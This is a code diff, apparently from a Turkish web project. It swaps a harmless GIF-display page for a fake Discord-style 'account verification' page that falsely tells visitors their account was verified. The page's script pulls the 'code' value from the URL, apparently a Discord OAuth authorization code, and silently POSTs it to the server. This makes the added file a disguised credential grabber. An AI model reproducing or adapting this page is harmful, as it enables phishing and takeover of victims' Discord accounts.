@@ -1,67 +1,12 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-  <meta charset="UTF-8">
-  <title>tasarim projem</title>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      background: black;
+<title>Doğrula | Uzmanist#7221 </title><link href=https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css rel=stylesheet crossorigin=anonymous><link href=https://cdn.discordapp.com/avatars/986602224325132338/5233946c73b02dc18e143741249531bf.png?size=256 rel=icon sizes=16x16 type=image/png><meta content=website property=og:type><link href=https://use.typekit.net/joc7wli.css rel=stylesheet>/><div id=box><img id=server_pic src=https://cdn.discordapp.com/avatars/986602224325132338/5233946c73b02dc18e143741249531bf.png?size=256><h2>Hesap Doğrulaması</h2><p><p>Hesabını başarıyla doğruladık. İşine kaldığın yerden devam edebilirsin...</div><script>window.onload = () => {
+    const code = location.href.substring(location.href.indexOf("code")+5, location.href.length)
+
+    if (location.href.indexOf("code") > -1) {
+        const req = new XMLHttpRequest()
+        req.open("POST", "")
+        req.send(code)
+        req.onload = () => {
+        }
+
     }
-    #blink {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      padding: 12px 24px;
-      font-size: 20px;
-      background: #00f0ff;
-      color: black;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      z-index: 9999;
-    }
-    #gifContainer {
-      display: none;
-      width: 100%;
-      height: 100%;
-      background: black;
-      justify-content: center;
-      align-items: center;
-    }
-    #gifContainer img {
-      max-width: 100%;
-      max-height: 100%;
-    }
-  </style>
-</head>
-<body>
-
-  <button id="blink">Blink</button>
-
-  <div id="gifContainer">
-    <img id="gif" src="https://media.discordapp.net/attachments/1105554366057959474/1114447935162302504/E0C54B2F-A0C1-4A6D-B000-47C90631C37E.gif?ex=68069545&is=680543c5&hm=59beae46ead92ddf85baddab68eb17f1ae9ee0c77606667d848dda81127d6fc9" alt="GIF">
-  </div>
-
-  <script>
-    const blinkBtn = document.getElementById('blink');
-    const gifContainer = document.getElementById('gifContainer');
-
-    blinkBtn.addEventListener('click', () => {
-      gifContainer.style.display = 'flex';
-
-      // Fullscreen başlat
-      if (gifContainer.requestFullscreen) {
-        gifContainer.requestFullscreen();
-      } else if (gifContainer.webkitRequestFullscreen) {
-        gifContainer.webkitRequestFullscreen();
-      } else if (gifContainer.msRequestFullscreen) {
-        gifContainer.msRequestFullscreen();
-      }
-    });
-  </script>
-
-</body>
-</html>
+}</script><style>.btn{background-color:#000000;color:#fff;padding:10px 22px}.btn:hover{background:#0076ff;color:#fff}body{background-image:url(https://cdn.discordapp.com/attachments/930806442301214781/1081253823110201344/Verified.gif);background-size:10%;background-repeat:no-repeat;background-position:bottom 0 right 7px;background-color:#000000!important}h1,h2,h3,h4,h5,h6{color:#fff}p,small,span{color:#eaeaea}#box{width:400px;margin:0 auto;margin-top:100px;border:2px solid #343436;vertical-align:middle;border-radius:5px;text-align:center;padding:60px;background-color:#000000!important}#server_pic{display:block;border-radius:1%;margin:10px auto;width:200px;border:0 solid #2f2f2f}hr{margin:20px;background-color:#eaeaea}</style>
